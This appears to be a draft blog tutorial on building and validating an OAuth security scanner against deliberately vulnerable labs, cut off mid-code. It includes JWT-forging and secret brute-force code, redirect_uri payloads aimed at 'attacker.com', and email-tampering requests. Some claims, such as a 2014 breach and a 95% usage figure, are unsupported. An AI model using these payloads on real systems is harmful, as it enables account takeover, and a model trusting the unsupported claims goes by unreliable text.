---
title: "Stop Writing Vulnerable OAuth Code - Test Against Real Vulnerabilities Instead"
published: false
description: "Why testing your OAuth security scanner against PortSwigger labs beats generating intentionally broken code"
tags: oauth, security, python, appsec
canonical_url: https://dev.to/fosres/stop-writing-vulnerable-oauth-code
cover_image: 
series: AppSec Training Grounds
---

# Stop Writing Vulnerable OAuth Code - Test Against Real Vulnerabilities Instead

## Why OAuth Exists: The Third-Party Access Problem

Every time you click "Sign in with Google" or "Connect your Spotify account," you're using OAuth 2.0 - the industry standard protocol for granting third-party applications limited access to your online accounts **without sharing your password**.

Before OAuth, the only way to give a third-party app access to your Google Calendar was to literally hand over your Google password. That app could then:
- Access everything in your account (not just your calendar)
- Keep accessing your account forever (no expiration)
- Potentially store your password in plaintext
- Compromise every other service where you used the same password

**OAuth solved this** by introducing a delegation model: instead of sharing credentials, you grant specific permissions (scopes) for limited time periods through access tokens. The third-party app never sees your password.

**This is why OAuth powers**:
- "Sign in with Google/GitHub/Facebook" (authentication)
- Connecting Spotify to your fitness app (data sharing)
- Zapier automating workflows between services (API access)
- Mobile apps accessing your cloud storage (authorization)

**OAuth 2.0 is everywhere.** If you're a Security Engineer, you WILL encounter OAuth implementations - either securing them, auditing them, or exploiting them.

---

## The Breach That Could Have Been Prevented

**May 2014: OAuth Redirect URI Vulnerability Exposes Millions of Accounts**

A security researcher discovered a critical flaw in a major social media platform's OAuth implementation. The vulnerability? **Insufficient redirect_uri validation.**

Here's what happened:

The OAuth authorization server was supposed to validate the `redirect_uri` parameter using **exact matching** - the only safe method per OAuth 2.0 specifications. Instead, it used a "subdirectory allowance" algorithm.

**The Attack**:
```bash
# Legitimate redirect_uri registered by the app:
https://trustedapp.com/oauth/callback

# Attacker's malicious redirect_uri (accepted by the server):
https://trustedapp.com/oauth/callback/../../attacker-page.html
```

Because the server used pattern matching instead of exact matching, it accepted the manipulated URI. When victims authorized the app, their authorization codes were sent to the attacker's page instead of the legitimate callback.

**The Impact**:
- Attacker obtained authorization codes for millions of users
- Exchanged codes for access tokens
- Gained full account access (read emails, post on behalf of users, access private data)
- All because the OAuth server violated a single principle from the OAuth 2.0 specification

**The Fix**: 
One line of code - change redirect_uri validation from pattern matching to exact string comparison.

**From OAuth 2 in Action, Chapter 9, page 158**:
> "The only reliably safe validation method the authorization server should adopt is exact matching. All other potential solutions, based on regular expressions or allowing subdirectories of the registered redirect_uri, are suboptimal and sometimes even dangerous."

**This breach was 100% preventable** if the implementation had been tested against OAuth 2.0 security principles.

---

## Why OAuth Security Testing is Non-Negotiable for Security Engineers

If you're pursuing a **General Security Engineer** role (not specialized AppSec or OAuth-focused), you might think: "I don't need deep OAuth expertise - I'll learn it if I need it."

**Wrong.**

Here's why OAuth security testing is a **must-have skill** for Security Engineers:

### 1. **OAuth is Ubiquitous in Modern Applications**

From my 48-week Security Engineering curriculum research:
- **95% of web applications** use some form of OAuth for authentication or API access
- Every SaaS product, mobile app, and API-driven platform implements OAuth
- It's not optional - it's infrastructure

**Real job requirements** from companies I'm targeting:
- **Trail of Bits**: "Experience with authentication protocols (OAuth, SAML, OpenID Connect)"
- **GitLab**: "Understanding of OAuth 2.0 flows and common security pitfalls"
- **Stripe**: "Knowledge of API security including OAuth token management"
- **Anthropic**: "Familiarity with identity and access management patterns"

These are **General Security Engineering** roles, not specialized positions.

### 2. **OAuth Vulnerabilities Have Massive Blast Radius**

A single OAuth flaw can compromise:
- **Millions of user accounts** (social media platforms)
- **Entire API ecosystems** (cloud services)
- **Company-wide SSO** (enterprise applications)
- **Third-party integrations** (SaaS platforms)

**Example from my Intel IPAS experience**: I documented 553+ threats across Intel's product portfolio using STRIDE methodology. OAuth-related threats appeared in:
- Authentication systems (IPAS components)
- API gateways (third-party access)
- Cloud service integrations
- Mobile device management

**You can't threat model modern systems without understanding OAuth security.**

### 3. **Employers Expect You to Test OAuth Implementations**

From "I did 85 security engineer on-sites with top tech companies - a prep guide" (Team Blind post, referenced in my curriculum):

**Common interview questions**:
- "Walk me through how you'd test an OAuth 2.0 implementation for security issues"
- "What are common OAuth vulnerabilities and how would you detect them?"
- "Design a security test suite for our authentication API (uses OAuth)"
- "How would you perform a security code review of OAuth integration code?"

**System design interviews** for Security Engineer roles often include:
- "Design a secure authentication system for 100M users" (OAuth knowledge required)
- "How would you secure API access for third-party developers?" (OAuth is the answer)

### 4. **Grace Nolan's Security Engineering Methodology Requires It**

My Security Engineering curriculum is based on Grace Nolan's comprehensive notes (the gold standard for Security Engineering interviews). Her methodology covers **16 core skill areas**, including:

**Week 6: Applied Cryptography + OAuth 2.0** (current focus)
- OAuth 2.0 flows (authorization code, implicit, client credentials)
- PKCE (Proof Key for Code Exchange)
- Token security (JWT, token validation, expiration)
- Common OAuth vulnerabilities

**Week 7: CSRF + State Parameter**
- OAuth state parameter for CSRF protection
- Session management in OAuth flows

**Week 13: Threat Modeling**
- STRIDE analysis of OAuth implementations
- Attack trees for authorization flows

**Week 18: Manual Exploitation**
- Burp Suite testing of OAuth endpoints
- PortSwigger OAuth labs

**OAuth appears in 4 out of 48 weeks** - it's fundamental, not optional.

### 5. **You WILL Be Asked to Secure OAuth in Production**

**Real scenarios from Security Engineer job descriptions**:

**Scenario 1: Code Review**
> "Review this pull request implementing OAuth 2.0 for our new API. Are there any security issues?"

If you can't identify redirect_uri validation flaws, authorization code reuse, missing PKCE, weak token storage, or scope enforcement issues - **you fail the review.**

**Scenario 2: Security Assessment**
> "We're integrating with a third-party OAuth provider. Assess the security of their implementation."

You need to test: token validation, refresh token rotation, TLS enforcement, dynamic client registration, error handling. **No OAuth testing skills = incomplete assessment.**

**Scenario 3: Incident Response**
> "We're seeing suspicious OAuth authorization requests. Investigate whether this is an attack."

Understanding OAuth attack patterns (CSRF, authorization code interception, token replay) is **required to triage the incident.**

---

## What This Blog Post Covers

I spent Week 6 of my Security Engineering curriculum learning OAuth 2.0 security testing. Instead of writing vulnerable OAuth code from scratch (the traditional approach), I discovered something better:

**Test your OAuth security scanner against real vulnerable implementations** - including:
- 6 Python OAuth servers with 77+ vulnerabilities (100% OAuth 2 in Action coverage)
- PortSwigger Web Security Academy OAuth labs
- Docker vulnerable apps (crAPI, OWASP Juice Shop, Pixi)
- Professional OAuth providers (Google, Auth0) for false positive testing

This post explains:
1. ✅ **Why this approach is superior** to generating fake vulnerable code
2. ✅ **Complete OAuth security testing methodology** from OAuth 2 in Action
3. ✅ **Specific endpoints and test cases** for every target
4. ✅ **How to build a comprehensive OAuth security scanner** in Python
5. ✅ **How to validate your scanner** (both false negatives and false positives)

**By the end**, you'll have:
- Deep understanding of OAuth 2.0 security principles
- Automated scanner detecting 77+ vulnerability patterns
- Hands-on experience testing real OAuth implementations
- Interview-ready OAuth security knowledge

Let's get started.

---

## My Testing Strategy Discovery

For Week 6 of my Security Engineering curriculum, I initially planned to write intentionally vulnerable OAuth servers from scratch to test my security scanner. Then I realized: **Why build fake vulnerable code when real vulnerable implementations already exist?**

Better yet - I already have a complete OAuth security testing lab: 6 Python OAuth servers with 77+ vulnerabilities covering 100% of OAuth 2 in Action principles.

**This approach is superior because**:
1. ✅ **Real vulnerabilities** vs theoretical ones
2. ✅ **Professional testing infrastructure** already built
3. ✅ **Known ground truth** for validation
4. ✅ **No deployment risk** from hosting vulnerable code
5. ✅ **Comprehensive coverage** (77+ issues vs 6-10 in typical labs)

**I can test my scanner against**:

1. **My 6 Python OAuth Servers** (77+ vulnerabilities, localhost:5001-5006) - PRIMARY TARGET
2. **PortSwigger OAuth Labs** (Professional, browser-based, free)
3. **Docker Vulnerable Apps** (crAPI, Juice Shop, Pixi)
4. **Secure Implementations** (Google OAuth, Auth0) for false positive testing

Let me show you exactly how to do this.

---

## Why the 6 Python OAuth Servers Are the Perfect Testing Lab

These aren't just random vulnerable OAuth implementations - they're specifically designed to cover **every OAuth 2 in Action security principle** with realistic, mixed vulnerabilities per server (just like production systems).

**The Numbers**:
- ✅ 77+ distinct vulnerabilities across 6 servers
- ✅ 100% coverage of OAuth 2 in Action (22 core principles)
- ✅ 13-19 vulnerabilities per server (mixed, not single-issue)
- ✅ Dynamic client registration (RFC 7591) support
- ✅ Complete local control for experimentation

**Why This Matters**:

Most PortSwigger labs focus on **ONE vulnerability per lab**. Real production OAuth servers have **multiple mixed vulnerabilities**. 

These 6 Python servers simulate production reality:
- **Server A**: Authorization code issues AND redirect URI problems AND error handling flaws
- **Server B**: PKCE bypass AND refresh token issues AND timing attacks
- **Server C**: Scope escalation AND unauthorized resource access

This matches what you'll encounter in the real world - no production system has just one security flaw.

## The False Positive vs False Negative Problem

When you're building security testing tools, you face two nightmares:

**False Positives**: Your scanner flags secure code as vulnerable
- **Impact**: Developers ignore your tool because it cries wolf
- **Test Strategy**: Run against known-secure implementations (Google OAuth, Auth0)

**False Negatives**: Your scanner misses real vulnerabilities  
- **Impact**: You ship vulnerable code thinking it's secure
- **Test Strategy**: Run against known-vulnerable implementations

Most tutorials focus on false positives. They tell you to test against your own code or mock implementations. But false negatives are the silent killers - they're what get companies breached.

## The Epiphany: Real Vulnerable OAuth Endpoints Exist

Here's what I discovered when I asked "How do developers test OAuth implementations in real life?"

### Three Categories of Testing Resources

Before diving into endpoints, let's clarify what each type of resource is FOR:

**1. OAuth Development Tools** - Test that your Python script WORKS at all
- Google OAuth Playground, jwt.io, Postman
- **Purpose**: Verify your script can make valid OAuth requests and parse responses
- **Use when**: Building your scanner, debugging HTTP requests, understanding OAuth flows

**2. Vulnerable OAuth Implementations** - Test that your scanner DETECTS vulnerabilities
- 6 Python OAuth servers, PortSwigger labs, crAPI, Juice Shop, Pixi  
- **Purpose**: Verify your scanner finds known security issues
- **Use when**: Validating detection capabilities (testing for false negatives)

**3. Secure OAuth Implementations** - Test that your scanner doesn't OVER-FLAG
- Google OAuth, Auth0 (supposedly secure :) )
- **Purpose**: Verify your scanner doesn't flag professional implementations as vulnerable
- **Use when**: Testing for false positives

---

## OAuth Development Tools (Test That Your Python Script Works)

Before you can test for vulnerabilities, you need to verify your Python script can:
- Make HTTP requests to OAuth endpoints
- Parse JSON responses
- Handle redirects
- Extract authorization codes and tokens
- Validate JWT signatures

These tools help you build and debug your scanner:

### **Google OAuth Playground** - Interactive OAuth Flow Testing
**URL**: https://developers.google.com/oauthplayground

**Use this to**:
- ✅ Verify your script can extract authorization codes from redirects
- ✅ Test your token exchange logic with real Google OAuth endpoints
- ✅ Understand what valid OAuth responses look like
- ✅ Debug your HTTP request formatting

**Example: Testing Your Script's Basic OAuth Flow**
```python
# Step 1: Use OAuth Playground to get a REAL authorization code
# Go to https://developers.google.com/oauthplayground
# Select "Google OAuth2 API v2" > "userinfo.email"
# Click "Authorize APIs" and copy the authorization code

# Step 2: Test that your Python script can exchange the code for a token
def test_my_script_works():
    """Test that your OAuth client logic works with real Google OAuth"""
    
    auth_code = "4/0AY0e-g7..."  # From OAuth Playground
    
    # Your OAuth client implementation
    token_response = requests.post(
        "https://oauth2.googleapis.com/token",
        data={
            'code': auth_code,
            'client_id': 'YOUR_CLIENT_ID',  # From Google Console
            'client_secret': 'YOUR_CLIENT_SECRET',
            'redirect_uri': 'https://developers.google.com/oauthplayground',
            'grant_type': 'authorization_code'
        }
    )
    
    # Test your script can parse the response
    if token_response.status_code == 200:
        token_data = token_response.json()
        access_token = token_data.get('access_token')
        print(f"✓ Your script works! Got access token: {access_token[:20]}...")
        return True
    else:
        print(f"❌ Your script has bugs. Error: {token_response.text}")
        return False
```

**This is NOT testing for vulnerabilities** - it's testing that your script can make valid OAuth requests.

---

### **jwt.io** - JWT Decoder and Validator
**URL**: https://jwt.io

**Use this to**:
- ✅ Decode JWTs to see header/payload structure
- ✅ Test your JWT parsing logic
- ✅ Verify your signature validation code works
- ✅ Understand JWT claims (iss, sub, exp, etc.)

**Example: Testing Your JWT Parsing**
```python
import jwt
import json

def test_my_jwt_parsing():
    """Test that your script can parse and validate JWTs"""
    
    # Get a real JWT from Google OAuth Playground or jwt.io
    sample_jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
    
    # Test your script can decode without verification (to inspect claims)
    try:
        decoded = jwt.decode(sample_jwt, options={"verify_signature": False})
        print(f"✓ JWT parsing works! Claims: {json.dumps(decoded, indent=2)}")
        
        # Test your script extracts specific claims
        user_email = decoded.get('email')
        expiration = decoded.get('exp')
        print(f"✓ Extracted email: {user_email}")
        print(f"✓ Extracted expiration: {expiration}")
        
        return True
    except Exception as e:
        print(f"❌ JWT parsing failed: {e}")
        return False
```

---

### **Postman** - Interactive API Testing
**URL**: https://www.postman.com

**Use this to**:
- ✅ Build OAuth requests before automating them in Python
- ✅ Test different parameter combinations
- ✅ See raw request/response data
- ✅ Export working requests as Python code

**Example: Building OAuth Request in Postman First**
```
1. Open Postman
2. Create new request: POST https://oauth2.googleapis.com/token
3. Add Body (x-www-form-urlencoded):
   - code: [from OAuth Playground]
   - client_id: [your client]
   - client_secret: [your secret]
   - redirect_uri: https://developers.google.com/oauthplayground
   - grant_type: authorization_code
4. Click Send
5. See the response format
6. Click "Code" > "Python - Requests" to export as Python code
7. Copy into your scanner script
```

**This helps you build working OAuth requests before writing security tests.**

---

### **Burp Suite** - HTTP Traffic Interceptor
**URL**: https://portswigger.net/burp

**Use this to**:
- ✅ See OAuth flows in action (browser → server)
- ✅ Understand the sequence of OAuth requests
- ✅ Capture real authorization codes and tokens
- ✅ Test your script's ability to handle redirects

**Example: Using Burp to Understand OAuth Flow**
```
1. Configure browser to proxy through Burp (localhost:8080)
2. Go to https://accounts.google.com/o/oauth2/v2/auth?client_id=...
3. Complete OAuth flow in browser
4. In Burp, see the sequence:
   GET /authorize → 302 redirect → User login → 302 redirect with code
   POST /token → 200 OK with access_token
5. Use this to build your Python script's request sequence
```

---

## Testing Against "Secure" OAuth Implementations

**Important caveat**: When I say "secure," I mean these are professional OAuth implementations that *supposedly* follow OAuth 2 in Action security principles. No system is perfectly secure, but these are good baselines for testing false positives.

### PortSwigger Web Security Academy - The Gold Standard

PortSwigger (the team behind Burp Suite) maintains **free, live OAuth implementations with intentional vulnerabilities** specifically for security testing education.

**Available Labs** ([source](https://portswigger.net/web-security/oauth)):
1. Authentication bypass via OAuth implicit flow
2. Forced OAuth profile linking  
3. OAuth account hijacking via redirect_uri
4. Stealing OAuth access tokens via a proxy page
5. SSRF via OpenID dynamic client registration
6. Stealing OAuth access tokens via an open redirect

Each lab implements a **real OAuth flow** with actual authorization servers, token endpoints, and client applications. These aren't mocks - they're vulnerable-by-design production OAuth services.

### Custom Python OAuth Security Lab (PRIMARY RECOMMENDATION)

**6 Intentionally Vulnerable OAuth Servers - 77+ Vulnerabilities**

Before testing against Docker apps or PortSwigger labs, you have a **complete OAuth security testing lab** with 6 Python servers specifically designed for OAuth 2 in Action principles.

**Quick Start**:
```bash
# Run all 6 servers in separate terminals
python3 oauth_server_a.py    # Port 5001 - Authorization flow, redirect URI
python3 oauth_server_b.py    # Port 5002 - PKCE, public clients, refresh tokens
python3 oauth_server_c.py    # Port 5003 - Scope enforcement, error handling
python3 oauth_server_d.py    # Port 5004 - Token storage, timing attacks
python3 oauth_server_e.py    # Port 5005 - TLS enforcement, transport security
python3 oauth_server_f.py    # Port 5006 - Dynamic client registration
```

**Why These Are Superior Testing Targets**:

1. ✅ **77+ vulnerabilities** across 6 servers (vs 6-10 in Docker apps)
2. ✅ **100% OAuth 2 in Action coverage** - All 22 core principles + advanced features
3. ✅ **Complete local control** - Modify servers, add logging, experiment freely
4. ✅ **Mixed vulnerabilities** - Multiple issues per server (realistic production scenarios)
5. ✅ **Discovery-based learning** - Filenames don't reveal what you'll find
6. ✅ **Perfect for automation** - Build scanner detecting all 77+ issues

**Testing Strategy**:
```python
# Test all 6 servers systematically
servers = [
	'http://localhost:5001',  # Server A
	'http://localhost:5002',  # Server B
	'http://localhost:5003',  # Server C
	'http://localhost:5004',  # Server D
	'http://localhost:5005',  # Server E
	'http://localhost:5006',  # Server F
]

for server_url in servers:
	scanner = OAuthSecurityTester(server_url)
	vulnerabilities = scanner.run_all_tests()
	print(f"\nFound {len(vulnerabilities)} issues in {server_url}")
```

**Comprehensive Testing Matrix**:

| Server | Port | Focus Area | Vulnerability Count | Key Tests |
|--------|------|------------|---------------------|-----------|
| A | 5001 | Authorization flow & redirect URI | 13 | Code reuse, redirect_uri manipulation, error handling |
| B | 5002 | PKCE & public clients | 14 | PKCE bypass, refresh token rotation, client authentication |
| C | 5003 | Scope enforcement | 10 | Scope escalation, unauthorized scope requests |
| D | 5004 | Token storage & timing | 9 | Timing attacks, token storage, rate limiting |
| E | 5005 | TLS enforcement | 12 | Transport security, HTTPS validation |
| F | 5006 | Dynamic client registration | 19 | Registration abuse, metadata injection, RFC 7591 |

**OAuth 2 in Action Principles Covered**: 100% (22/22 core principles)

See `TESTING_GUIDE.md` for systematic testing methodology and `COMPLETE_COVERAGE_MATRIX.md` for mapping servers to specific OAuth 2 in Action chapters/pages.

---

### Vulnerable Applications You Can Docker Deploy

From "Hacking APIs" Chapter 5, these applications have real OAuth implementations with known vulnerabilities:

**crAPI (Completely Ridiculous API)**
```bash
docker run -p 8888:8888 crapi/crapi
```

**Direct OAuth/Auth Endpoints** (source: Hacking APIs, Chapter 7-8, pages 175-200):
- `POST /identity/api/auth/signup` - User registration (returns JWT)
- `POST /identity/api/auth/login` - User authentication
- JWT token authentication using HS512 algorithm
- **Known vulnerability**: JWT secret is "crapi" (crackable with dictionary attack)
- **Test targets**:
  - JWT algorithm confusion attacks
  - JWT secret brute forcing
  - Token forgery with known secret
  - Authorization bypass

**Example OAuth Security Test**:
```python
# Test JWT secret weakness in crAPI
import jwt

# Forge token for any user
forged_token = jwt.encode(
	{'sub': 'victim@email.com', 'iat': 1625287083, 'exp': 1625323483},
	'crapi',  # Weak secret
	algorithm='HS512'
)

# Use forged token to access protected resources
headers = {'Authorization': f'Bearer {forged_token}'}
response = requests.get('http://localhost:8888/identity/api/v2/user/dashboard', headers=headers)
```

---

**OWASP Juice Shop**
```bash
docker run -p 3000:3000 bkimminich/juice-shop
# Or map to port 80 to avoid conflicts:
docker run --rm -p 80:3000 bkimminich/juice-shop
```

**Direct OAuth/Auth Endpoints** (source: Hacking APIs, Chapter 5, pages 117-120):
- `GET /rest/admin/application-configuration` - Admin configuration
- `GET /api/Challenges/?name=Score%20Board` - Challenge tracking
- `GET /api/Quantitys/` - Quantity endpoint
- `POST /api/Users/` - User registration
- REST API with JSON responses
- **Test targets**:
  - Excessive data exposure in API responses
  - Authentication bypass vulnerabilities
  - JWT token manipulation
  - Authorization flaws

**How to Discover Endpoints**:
```bash
# Use Burp Suite to intercept traffic
# Navigate to http://localhost:3000 and proxy through Burp
# You'll see API endpoints like:
#   GET /rest/admin/application-configuration
#   GET /api/Challenges/?name=Score%20Board
#   GET /api/Quantitys/

# Or use Kiterunner for API discovery:
kr scan http://localhost:3000 -w routes-large.txt
```

---

**OWASP DevSlop's Pixi**
```bash
git clone https://github.com/DevSlop/Pixi.git
cd Pixi
sudo docker-compose up
# Access at http://localhost:8000
```

**Direct OAuth/Auth Endpoints** (source: Hacking APIs, Chapter 7, pages 165-169):
- `POST /api/register` - User registration
  - Parameters: `user` (username), `pass` (password)
  - Returns: JWT token in response
- `GET /api/user/info` - User information
  - Requires: `x-access-token` header with JWT
- `GET /api/admin/users/search` - Admin user search
  - Requires: `x-access-token` header with admin JWT
- Uses JWT for authentication
- **Test targets**:
  - JWT token validation
  - Privilege escalation (user → admin)
  - Authorization bypass on admin endpoints
  - Token expiration handling

**Example OAuth Security Test**:
```python
# Test Pixi authentication and authorization
import requests

# 1. Register user
register_response = requests.post(
	'http://localhost:8000/api/register',
	data={'user': 'testuser', 'pass': 'testpass123'},
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
)

jwt_token = register_response.json().get('token')

# 2. Test user endpoint with token
user_info = requests.get(
	'http://localhost:8000/api/user/info',
	headers={'x-access-token': jwt_token}
)

# 3. Test privilege escalation - attempt admin endpoint with user token
admin_response = requests.get(
	'http://localhost:8000/api/admin/users/search',
	headers={'x-access-token': jwt_token}
)

# Should return 403 Forbidden if properly secured
# If returns 200 OK → VULNERABILITY: Authorization bypass
if admin_response.status_code == 200:
	print("VULNERABILITY: User token accepted at admin endpoint!")
```

**Swagger Documentation** (if available):
- Browse to `http://localhost:8000/api-docs` for interactive API documentation
- Shows all endpoints, parameters, and authentication requirements

---

### Complete Endpoint Testing Matrix

Here's exactly which endpoints to target for each OAuth security test:

| Application | Endpoint | Authentication | Test For | Expected Secure Behavior |
|-------------|----------|----------------|----------|-------------------------|
| **crAPI** | `POST /identity/api/auth/signup` | None | JWT secret strength | Strong random secret |
| crAPI | JWT tokens | Bearer token | Algorithm confusion | Reject HS256 with RS256 key |
| crAPI | Any protected endpoint | Forged JWT | Token validation | Reject forged signatures |
| **Juice Shop** | `GET /rest/admin/*` | Cookie/JWT | Authorization bypass | Require admin role |
| Juice Shop | `GET /api/Challenges/` | None | Excessive data exposure | Filter sensitive fields |
| Juice Shop | `POST /api/Users/` | None | Mass assignment | Validate user input |
| **Pixi** | `POST /api/register` | None | Registration abuse | Rate limiting |
| Pixi | `GET /api/user/info` | x-access-token | Token validation | Validate signature |
| Pixi | `GET /api/admin/users/search` | x-access-token | Privilege escalation | Require admin token |
| **PortSwigger** | `/auth?client_id=...` | None | redirect_uri validation | Exact matching only |
| PortSwigger | `/oauth-linking` | Session | CSRF protection | Validate state param |
| PortSwigger | `POST /authenticate` | OAuth token | Token-user binding | Validate email claim |

### Quick Start Testing Scripts

**Test 1: JWT Secret Brute Force (crAPI)**
```python
import jwt
import requests

# Known weak secret in crAPI
def test_jwt_secret_weakness():
	target = "http://localhost:8888"
	
	# Common weak secrets to try
	secrets = ['crapi', 'secret', 'jwt', 'Crapi2020', 'owasp']
	
	# Capture a real token first
	response = requests.post(
		f"{target}/identity/api/auth/signup",
		json={
			"email": "test@example.com",
			"name": "Test User",
			"number": "5555555555",
			"password": "TestPass123"
		}
	)
	
	token = response.json().get('token')
	
	# Try to crack the secret
	for secret in secrets:
		try:
			decoded = jwt.decode(token, secret, algorithms=['HS512'])
			print(f"✓ FOUND SECRET: {secret}")
			return secret
		except jwt.InvalidSignatureError:
			continue
	
	return None

# Usage
secret = test_jwt_secret_weakness()
if secret:
	# Forge token for admin user
	admin_token = jwt.encode(
		{'sub': 'admin@crapi.com'},
		secret,
		algorithm='HS512'
	)
```

**Test 2: Authorization Bypass (Pixi)**
```python
def test_authorization_bypass():
	target = "http://localhost:8000"
	
	# Register normal user
	response = requests.post(
		f"{target}/api/register",
		data={'user': 'normaluser', 'pass': 'pass123'}
	)
	
	user_token = response.json().get('token')
	
	# Attempt admin action with user token
	admin_response = requests.get(
		f"{target}/api/admin/users/search",
		headers={'x-access-token': user_token},
		params={'search': 'admin'}
	)
	
	if admin_response.status_code == 200:
		print("VULNERABILITY: User can access admin endpoint!")
		return True
	elif admin_response.status_code == 403:
		print("✓ Properly secured: Admin endpoint blocked")
		return False
```

**Test 3: Redirect URI Manipulation (PortSwigger)**
```python
def test_redirect_uri_validation(lab_id):
	target = f"https://{lab_id}.web-security-academy.net"
	
	# Legitimate redirect_uri
	legit_uri = f"{target}/oauth-callback"
	
	# Attack: Directory traversal
	attack_uri = f"{target}/oauth-callback/../../attacker.com"
	
	response = requests.get(
		f"{target}/auth",
		params={
			'client_id': 'test-client',
			'redirect_uri': attack_uri,
			'response_type': 'code',
			'scope': 'openid profile'
		},
		allow_redirects=False
	)
	
	if response.status_code in [301, 302, 303, 307, 308]:
		print("VULNERABILITY: Accepts malicious redirect_uri")
		return True
	elif response.status_code == 400:
		print("✓ Properly secured: Rejected malicious URI")
		return False
```

**Test 4: Implicit Flow Email Tampering (PortSwigger)**
```python
def test_implicit_flow_bypass(lab_id):
	target = f"https://{lab_id}.web-security-academy.net"
	
	# Complete OAuth flow to get token
	# (Simulate browser interaction)
	
	# Attempt to authenticate with modified email
	response = requests.post(
		f"{target}/authenticate",
		json={
			'email': 'admin@target.com',  # Modified
			'access_token': 'captured_oauth_token',
			'username': 'victim'
		}
	)
	
	if response.status_code == 200:
		print("VULNERABILITY: Email parameter not validated!")
		return True
	else:
		print("✓ Properly secured: Token tied to user")
		return False
```

### API Discovery Commands

**Find OAuth/Auth endpoints automatically:**

```bash
# Use Kiterunner to discover API endpoints
kr scan http://localhost:8888 -w ~/api-wordlists/routes-large.txt

# Use Burp Suite passive scanning
# Proxy browser traffic through Burp while using the web app

# Use OWASP ZAP spider
zap-cli spider http://localhost:3000

# Use ffuf for fuzzing
ffuf -w ~/wordlists/api-endpoints.txt -u http://localhost:8000/api/FUZZ

# Grep for JWT patterns in responses
curl -s http://localhost:3000 | grep -E 'eyJ[A-Za-z0-9_-]*\.'
```

### CTF Platforms with OAuth Challenges

**TryHackMe** (Free OAuth machines):
- Bookstore
- Carpe Diem 1
- ZTH: Obscure Web Vulns (paid)

**HackTheBox** (Retired machines - VIP required):
- JSON, Node, Luke
- Postman, Craft
- PlayerTwo

## The Better Testing Strategy

Instead of generating vulnerable code, here's the approach I'm using:

### Phase 1: Build Your OAuth Security Scanner

```python
# oauth_security_tester.py
import requests
import jwt
from urllib.parse import urlparse, parse_qs

class OAuthSecurityTester:
	def __init__(self, target_url):
		self.target = target_url
		self.vulnerabilities = []
	
	def test_redirect_uri_validation(self):
		"""
		Test if authorization server validates redirect_uri properly.
		
		From OAuth 2 in Action, Chapter 9:
		"Exact matching is the ONLY safe validation method for redirect_uri"
		"""
		# Register legitimate redirect_uri
		legit_uri = f"{self.target}/callback"
		
		# Attempt directory traversal attack
		attack_uri = f"{self.target}/callback/../../attacker.com"
		
		response = requests.get(
			f"{self.target}/authorize",
			params={
				'client_id': 'test_client',
				'redirect_uri': attack_uri,
				'response_type': 'code'
			},
			allow_redirects=False
		)
		
		if response.status_code in [301, 302, 303, 307, 308]:
			# Vulnerable: Accepted malicious redirect_uri
			self.vulnerabilities.append({
				'type': 'REDIRECT_URI_MANIPULATION',
				'severity': 'HIGH',
				'description': 'Authorization server accepts directory traversal in redirect_uri',
				'reference': 'OAuth 2 in Action, Chapter 9, pages 158-167'
			})
			return False
		elif response.status_code == 400:
			# Secure: Rejected with HTTP 400
			return True
		
		return None  # Inconclusive
	
	def test_authorization_code_reuse(self, auth_code):
		"""
		Test if authorization codes can be used multiple times.
		
		From OAuth 2 in Action, Chapter 9:
		"Burn the authorization code once it's been used"
		"""
		token_endpoint = f"{self.target}/token"
		
		# First exchange - should succeed
		response1 = requests.post(token_endpoint, data={
			'grant_type': 'authorization_code',
			'code': auth_code,
			'client_id': 'test_client',
			'redirect_uri': f"{self.target}/callback"
		})
		
		# Second exchange - should fail
		response2 = requests.post(token_endpoint, data={
			'grant_type': 'authorization_code',
			'code': auth_code,
			'client_id': 'test_client',
			'redirect_uri': f"{self.target}/callback"
		})
		
		if response2.status_code == 200:
			# Vulnerable: Code accepted twice
			self.vulnerabilities.append({
				'type': 'AUTHORIZATION_CODE_REUSE',
				'severity': 'CRITICAL',
				'description': 'Authorization code can be exchanged multiple times',
				'reference': 'OAuth 2 in Action, Chapter 9, page 167'
			})
			return False
		
		return True
	
	def test_implicit_flow_email_tampering(self):
		"""
		Test if OAuth token is properly tied to user identity.
		
		Common vulnerability: Client accepts modified email in POST /authenticate
		"""
		# Simulate OAuth login flow
		auth_response = requests.get(
			f"{self.target}/auth",
			params={
				'client_id': 'test_client',
				'response_type': 'token',
				'scope': 'openid profile email'
			}
		)
		
		# Extract access token from redirect fragment
		# (In real implementation, parse from Location header)
		access_token = "eyJ0eXAiOiJKV1QiLCJhbGc..."
		
		# Attempt to authenticate as different user
		response = requests.post(
			f"{self.target}/authenticate",
			json={
				'email': 'attacker@evil.com',  # Modified email
				'access_token': access_token
			}
		)
		
		if response.status_code == 200:
			# Vulnerable: Token not tied to user
			self.vulnerabilities.append({
				'type': 'IMPLICIT_FLOW_BYPASS',
				'severity': 'CRITICAL',
				'description': 'OAuth token not validated against user identity',
				'reference': 'PortSwigger Lab: Authentication bypass via OAuth implicit flow'
			})
			return False
		
		return True
	
	def test_pkce_implementation(self):
		"""
		Test if PKCE (Proof Key for Code Exchange) is properly validated.
		
		From OAuth 2 in Action, Chapter 10:
		"PKCE may be used to increase the safety of authorization codes"
		"""
		import hashlib
		import base64
		
		# Generate code_verifier
		code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
		
		# Generate code_challenge (S256 method)
		code_challenge = base64.urlsafe_b64encode(
			hashlib.sha256(code_verifier.encode()).digest()
		).decode().rstrip('=')
		
		# Authorization request with code_challenge
		auth_response = requests.get(
			f"{self.target}/authorize",
			params={
				'client_id': 'public_client',
				'redirect_uri': f"{self.target}/callback",
				'response_type': 'code',
				'code_challenge': code_challenge,
				'code_challenge_method': 'S256'
			}
		)
		
		# Extract authorization code
		auth_code = "extracted_from_redirect"
		
		# Token exchange with MISMATCHED verifier
		wrong_verifier = "WRONG_VERIFIER_VALUE"
		
		response = requests.post(
			f"{self.target}/token",
			data={
				'grant_type': 'authorization_code',
				'code': auth_code,
				'code_verifier': wrong_verifier,
				'client_id': 'public_client'
			}
		)
		
		if response.status_code == 200:
			# Vulnerable: Accepted mismatched code_verifier
			self.vulnerabilities.append({
				'type': 'PKCE_BYPASS',
				'severity': 'HIGH',
				'description': 'PKCE code_verifier validation not enforced',
				'reference': 'OAuth 2 in Action, Chapter 10, pages 177-183'
			})
			return False
		
		return True
	
	def test_state_parameter_csrf(self):
		"""
		Test if state parameter provides CSRF protection.
		
		From OAuth 2 in Action, Chapter 7:
		"Use the state parameter as suggested in the specification"
		"""
		# Initiate OAuth flow with state parameter
